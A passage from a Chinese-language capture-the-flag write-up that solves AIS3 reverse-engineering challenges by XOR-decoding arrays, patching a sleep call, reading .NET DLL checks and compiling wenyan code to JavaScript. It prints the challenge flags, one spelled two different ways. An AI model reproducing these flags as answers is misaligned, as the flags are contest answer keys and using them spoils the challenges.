class="line"><span class="keyword">int</span> secret[<span class="number">100</span>]=&#123;</span><br><span class="line">   <span class="number">70</span>,  <span class="number">65</span>,  <span class="number">75</span>,  <span class="number">69</span>,  <span class="number">11</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">123</span>, <span class="number">104</span>,</span><br><span class="line">  <span class="number">111</span>, <span class="number">111</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">114</span>,  <span class="number">97</span>, <span class="number">121</span>,  <span class="number">95</span>,</span><br><span class="line">    <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>,   <span class="number">8</span>,   <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">115</span>,  <span class="number">95</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">  <span class="number">105</span>, <span class="number">115</span>,  <span class="number">95</span>,  <span class="number">97</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>, <span class="number">119</span>,</span><br><span class="line">   <span class="number">97</span>, <span class="number">121</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">115</span>,  <span class="number">95</span>,  <span class="number">97</span>, <span class="number">110</span>,</span><br><span class="line">    <span class="number">4</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">95</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>,   <span class="number">9</span>,   <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">102</span>, <span class="number">117</span>, <span class="number">108</span>,  <span class="number">95</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">109</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">97</span>, <span class="number">110</span>,</span><br><span class="line">  <span class="number">100</span>, <span class="number">125</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> key[<span class="number">50</span>]=&#123;</span><br><span class="line">    <span class="number">1</span>,  <span class="number">16</span>,   <span class="number">1</span>,  <span class="number">58</span>,  <span class="number">13</span>,  <span class="number">27</span>,  <span class="number">76</span>,  <span class="number">76</span>,  <span class="number">45</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">11</span>,  <span class="number">58</span>,  <span class="number">64</span>,  <span class="number">79</span>,  <span class="number">69</span>,   <span class="number">0</span>,  <span class="number">26</span>,  <span class="number">50</span>,   <span class="number">4</span>,  <span class="number">49</span>,</span><br><span class="line">   <span class="number">29</span>,  <span class="number">22</span>,  <span class="number">45</span>,  <span class="number">62</span>,  <span class="number">49</span>,  <span class="number">10</span>,  <span class="number">18</span>,  <span class="number">44</span>,   <span class="number">3</span>,  <span class="number">17</span>,</span><br><span class="line">   <span class="number">62</span>,  <span class="number">13</span>,  <span class="number">44</span>,   <span class="number">0</span>,  <span class="number">26</span>,  <span class="number">12</span>,  <span class="number">50</span>,  <span class="number">20</span>,  <span class="number">29</span>,   <span class="number">4</span>,</span><br><span class="line">    <span class="number">0</span>,  <span class="number">49</span>,   <span class="number">0</span>,  <span class="number">26</span>,   <span class="number">7</span>,   <span class="number">8</span>,  <span class="number">24</span>, <span class="number">118</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">96</span>;i+=<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> v1=secret[i+<span class="number">4</span>]*<span class="number">4</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			cout&lt;&lt;<span class="built_in"><span class="keyword">char</span></span>(secret[i+j]^key[v1+j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//AIS3&#123;You_are_the_master_of_time_management!!!!!&#125;</span></span><br></pre></td></tr></table></figure>

<p>FLAG:<code>AIS3&#123;You_are_the_master_of_time_manangement!!!!!&#125;</code></p>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution 2"></a>Solution 2</h3><p>這題也可以用 patch program 的方法解決，它印不出 flag 的主要原因是<code>main function</code>中的<code>sleep(0x8763)</code>間隔過久，所以我們只要把<code>sleep</code>的時間 patch 成<code>0</code>即可，這裡注意一下最後的輸出部分，<code>\r</code>會把游標移到最前方並將所有先前輸出洗掉，因此這裡也要 patch，完成後覆寫掉原檔案執行即可得到 flag。</p>
<p><img src="https://i.imgur.com/CXTA20V.jpg"></p>
<p><img src="https://i.imgur.com/vCCGCRj.jpg"></p>
<h2 id="Calculator-301-easy-NET"><a href="#Calculator-301-easy-NET" class="headerlink" title="Calculator [301] [easy][.NET]"></a>Calculator [301] [easy][.NET]</h2><div class="note default flat"><p>I built a simple calculator, although it has a lot of bugs :P<br>Author: LJP-TW</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1lKgN9AtkAT55lgY8qeJJP9L9awhOKAD4/view?usp=sharing">https://drive.google.com/file/d/1lKgN9AtkAT55lgY8qeJJP9L9awhOKAD4/view?usp=sharing</a></p>
</blockquote>
<p>這題應該可以算是去年的考古題，也是 .NET 的題目，我一樣使用 dnSpy 來分析它，<code>calculator.exe</code>的部分沒有發現甚麼除了計算機之外的其他功能，在<code>extentions</code>的部分發現了四個可疑的<code>.dll</code>檔(<code>AIS3.dll</code>、<code>AIS33.dll</code>、<code>AIS333.dll</code>、<code>AIS3333.dll</code>)，打開看發現裡面應該是輸出 flag 的條件，只有一些 xor 跟特殊位置的個別限制，也是使用手動的方法把 flag 打出來即可。</p>
<p><img src="https://i.imgur.com/mJbCVZG.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INDEX   0123456789012345678901234567890123456789012345</span><br><span class="line">AIS3    AIS3&#123;          A                             &#125;</span><br><span class="line">AIS33       &#123;D                                    G_G&#125;</span><br><span class="line">AIS333       D0T_N3T_FRAm3W0rk                  __</span><br><span class="line">AIS3333                      k_15_S0_C0mPlicaT3d</span><br><span class="line">        AIS3&#123;D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G&#125;</span><br></pre></td></tr></table></figure>

<p>FLAG:<code>AIS3&#123;D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G&#125;</code></p>
<h2 id="殼-463-easy"><a href="#殼-463-easy" class="headerlink" title="殼 [463] [easy]"></a>殼 [463] [easy]</h2><div class="note default flat"><p><img src="https://i.imgur.com/kMJqsse.jpg"><br>Author: artis24106</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1C_Q7RbdQufeyZyOMNG2eQ9w4vd4o--1l/view?usp=sharing">https://drive.google.com/file/d/1C_Q7RbdQufeyZyOMNG2eQ9w4vd4o--1l/view?usp=sharing</a></p>
</blockquote>
<p>這題給了一個不知名的<code>.wy</code>檔，上網查了一下是文言文編程語言，利用<a target="_blank" rel="noopener" href="https://github.com/wenyan-lang/wenyan%E7%9A%84%E6%8C%87%E4%BB%A4wenyan">github 上的工具</a><code>wenyan --compile 殼.wy</code>可將其轉換為較易讀(?)的 javascript。剩下的部分就是讀懂 code 內容了 😵。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*___wenyan_module_恆常_start___*/</span></span><br><span class="line"><span class="keyword">var</span> 恆常 = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> 大 = <span class="built_in">this</span>.大 = <span class="string">&quot;輸入「助」以獲得更多幫助&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 笆 = <span class="built_in">this</span>.笆 = <span class="string">&quot;/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 斯 = <span class="built_in">this</span>.斯 = <span class="string">&quot;k5aRmv==&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 啟 = <span class="built_in">this</span>.啟 = <span class="string">&quot;5KTMx8XKxf==&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 魠 = <span class="built_in">this</span>.魠 = <span class="string">&quot;kv==&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 歷 = <span class="built_in">this</span>.歷 = <span class="string">&quot;5KSS&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 託 = <span class="built_in">this</span>.託 = <span class="string">&quot;幫助幫助幫助幫助幫助幫助&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 師 = <span class="built_in">this</span>.師 = <span class="string">&quot;先帝創業未半而中道崩殂今天下三分益州疲弊此誠危急存亡之秋也然侍衛之臣不懈於內忠誌之士忘身於外者蓋追先帝之殊遇欲報之於陛下也誠宜開張聖聽以光先帝遺德恢弘誌士之氣不宜妄自菲薄引喻失義以塞忠諫之路也宮中府中俱為一體陟罰臧否不宜異同若有作奸犯科及為忠善者宜付有司論其刑賞以昭陛下平明之理不宜偏私使內外異法也侍中侍郎郭攸之費禕董允等此皆良實誌慮忠純是以先帝簡拔以遺陛下愚以為宮中之事事無大小悉以谘之然後施行必能裨補闕漏有所廣益將軍嚮寵性行淑均曉暢軍事試用於昔日先帝稱之曰能是以衆議舉寵為督愚以為營中之事悉以谘之必能使行陣和睦優劣得所親賢臣遠小人此先漢所以興隆也親小人遠賢臣此後漢所以傾頹也先帝在時每與臣論此事未嘗不歎息痛恨於桓靈也侍中尚書長史參軍此悉貞良死節之臣願陛下親之信之則漢室之隆可計日而待也臣本佈衣躬耕於南陽苟全性命於亂世不求聞達於諸侯先帝不以臣卑鄙猥自枉屈三顧臣於草廬之中谘臣以當世之事由是感激遂許先帝以驅馳後值傾覆受任於敗軍之際奉命於危難之間爾來二十有一年矣先帝知臣謹慎故臨崩寄臣以大事也受命以來夙夜憂歎恐托付不效以傷先帝之明故五月渡瀘深入不毛今南方巳定兵甲已足當獎率三軍北碇中原庶竭駑鈍攘除奸兇興複漢室還于舊都此臣所以報先帝而忠陛下之職分也至於斟酌損益進盡忠言則攸之禕允之任也願陛下托臣以討賊興複之效不效則治臣之罪以告先帝之靈若無興德之言則責攸之禕允等之慢以彰其咎陛下亦宜自謀以谘諏善道察納雅言深追先帝遺詔臣不勝受恩感激今當遠離臨錶涕零不知所言&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 秘旗 = <span class="built_in">this</span>.秘旗 = <span class="string">&quot;\x1b[38:5:181m獎\x1b[38:5:202m當\x1b[38:5:177m之\x1b[38:5:210m兇\x1b[38:5:191m深\x1b[38:5:170m定\x1b[38:5:189m忠\x1b[38:5:197m忠\x1b[38:5:192m複\x1b[38:5:226m除\x1b[38:5:177m率\x1b[38:5:226m月\x1b[38:5:191m月\x1b[38:5:170m都\x1b[38:5:177m三\x1b[38:5:178m還\x1b[38:5:177m三\x1b[38:5:209m先\x1b[38:5:188m而\x1b[38:5:197m忠\x1b[38:5:192m兇\x1b[38:5:198m故\x1b[38:5:192m複\x1b[38:5:226m巳\x1b[38:5:177m三\x1b[38:5:222m定\x1b[38:5:189m率\x1b[38:5:225m陛\x1b[38:5:194m軍\x1b[38:5:166m除\x1b[38:5:178m軍\x1b[38:5:186m忠\x1b[38:5:181m率\x1b[38:5:226m所\x1b[38:5:177m瀘\x1b[38:5:226m獎\x1b[38:5:181m獎\x1b[38:5:218m除\x1b[38:5:179m當\x1b[38:5:166m鈍\x1b[38:5:178m三\x1b[38:5:170m斟&quot;</span>; <span class="comment">/*已&#x27;: 2,&#x27;定&#x27;: 2 */</span></span><br><span class="line">&#125;; <span class="comment">/*___wenyan_module_恆常_end___*/</span> <span class="comment">/*___wenyan_module_鑿字秘術_start___*/</span></span><br><span class="line"><span class="keyword">var</span> 鑿字秘術 = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> 正閱 = <span class="built_in">this</span>.正閱 = <span class="string">&quot;data&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 已閱 = <span class="built_in">this</span>.已閱 = <span class="string">&quot;end&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 始碼 = <span class="built_in">this</span>.始碼 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    始碼 = <span class="built_in">this</span>.始碼 = 字 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans1 = <span class="built_in">String</span>.fromCharCode(字);</span><br><span class="line">        <span class="keyword">return</span> _ans1;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 字址 = <span class="built_in">this</span>.字址 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    字址 = <span class="built_in">this</span>.字址 = 字 =&gt; 址 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans2 = (<span class="function">(<span class="params">target</span>) =&gt;</span> (<span class="function">(<span class="params">idx</span>) =&gt;</span> target.charCodeAt(idx)))(字)(址);</span><br><span class="line">        <span class="keyword">return</span> _ans2;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 始於 = <span class="built_in">this</span>.始於 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    始於 = <span class="built_in">this</span>.始於 = 字 =&gt; 符 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans3 = (<span class="function">(<span class="params">target</span>) =&gt;</span> (<span class="function">(<span class="params">label</span>) =&gt;</span> target.startsWith(label)))(字)(符);</span><br><span class="line">        <span class="keyword">return</span> _ans3;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 字子 = <span class="built_in">this</span>.字子 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    字子 = <span class="built_in">this</span>.字子 = 字 =&gt; 址 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans4 = (<span class="function">(<span class="params">target</span>) =&gt;</span> (<span class="function">(<span class="params">idx</span>) =&gt;</span> target.substring(idx)))(字)(址);</span><br><span class="line">        <span class="keyword">return</span> _ans4;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 子字 = <span class="built_in">this</span>.子字 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    子字 = <span class="built_in">this</span>.子字 = 字 =&gt; 始 =&gt; 末 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans5 = (<span class="function">(<span class="params">target</span>) =&gt;</span> (<span class="function">(<span class="params">s</span>) =&gt;</span> (<span class="function">(<span class="params">e</span>) =&gt;</span> target.substring(s, e))))(字)(始)(末);</span><br><span class="line">        <span class="keyword">return</span> _ans5;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; <span class="comment">/*___wenyan_module_鑿字秘術_end___*/</span> <span class="comment">/*___wenyan_module_交互秘術_start___*/</span></span><br><span class="line"><span class="keyword">var</span> 交互秘術 = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> 正閱 = <span class="built_in">this</span>.正閱 = <span class="string">&quot;data&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> 已閱 = <span class="built_in">this</span>.已閱 = <span class="string">&quot;end&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> _ans1 = <span class="built_in">require</span>(<span class="string">&quot;readline&quot;</span>).createInterface(process.stdin, process.stdout);</span><br><span class="line">    <span class="keyword">var</span> 讀行 = _ans1;</span><br><span class="line">    <span class="keyword">var</span> 化言 = <span class="built_in">this</span>.化言 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    化言 = <span class="built_in">this</span>.化言 = 甲 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans2 = 甲.toString();</span><br><span class="line">        <span class="keyword">return</span> _ans2;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 發生 = <span class="built_in">this</span>.發生 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    發生 = <span class="built_in">this</span>.發生 = 事 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans3 = (<span class="function">(<span class="params">event</span>) =&gt;</span> process.stdin.emit(event))(事);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 監聽 = <span class="built_in">this</span>.監聽 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    監聽 = <span class="built_in">this</span>.監聽 = 事件 =&gt; 響應 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans4 = (<span class="function">(<span class="params">event</span>) =&gt;</span> (<span class="function">(<span class="params">func</span>) =&gt;</span> process.stdin.on(event, func)))(事件)(響應);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 聽寫 = <span class="built_in">this</span>.聽寫 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    聽寫 = <span class="built_in">this</span>.聽寫 = 事件 =&gt; 響應 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans5 = (<span class="function">(<span class="params">event</span>) =&gt;</span> (<span class="function">(<span class="params">func</span>) =&gt;</span> 讀行.on(event, func)))(事件)(響應);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 閱止 = <span class="built_in">this</span>.閱止 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    閱止 = <span class="built_in">this</span>.閱止 = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans6 = (<span class="function">() =&gt;</span> process.stdin.end())();</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> 輸出 = <span class="built_in">this</span>.輸出 = <span class="function"><span class="params">_</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">    輸出 = <span class="built_in">this</span>.輸出 = 文 =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> _ans7 = (<span class="function">(<span class="params">s</span>) =&gt;</span> process.stdout.write(s))(文);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; <span class="comment">/*___wenyan_module_交互秘術_end___*/</span></span><br><span class="line"><span class="keyword">var</span> 輸出 = 交互秘術.輸出;</span><br><span class="line"><span class="keyword">var</span> 聽寫 = 交互秘術.聽寫;</span><br><span class="line"><span class="keyword">var</span> 始碼 = 鑿字秘術.始碼;</span><br><span class="line"><span class="keyword">var</span> 字址 = 鑿字秘術.字址;</span><br><span class="line"><span class="keyword">var</span> 子字 = 鑿字秘術.子字;</span><br><span class="line"><span class="keyword">var</span> 始於 = 鑿字秘術.始於;</span><br><span class="line"><span class="keyword">var</span> 字子 = 鑿字秘術.字子;</span><br><span class="line"><span class="keyword">var</span> 啟 = 恆常.啟;</span><br><span class="line"><span class="keyword">var</span> 歷 = 恆常.歷;</span><br><span class="line"><span class="keyword">var</span> 託 = 恆常.託;</span><br><span class="line"><span class="keyword">var</span> 師 = 恆常.師;</span><br><span class="line"><span class="keyword">var</span> 大 = 恆常.大;</span><br><span class="line"><span class="keyword">var</span> 笆 = 恆常.笆;</span><br><span class="line"><span class="keyword">var</span> 斯 = 恆常.斯;</span><br><span class="line"><span class="keyword">var</span> 魠 = 恆常.魠;</span><br><span class="line"><span class="keyword">var</span> 秘旗 = 恆常.秘旗;</span><br><span class="line"><span class="keyword">var</span> 獲取 = <span 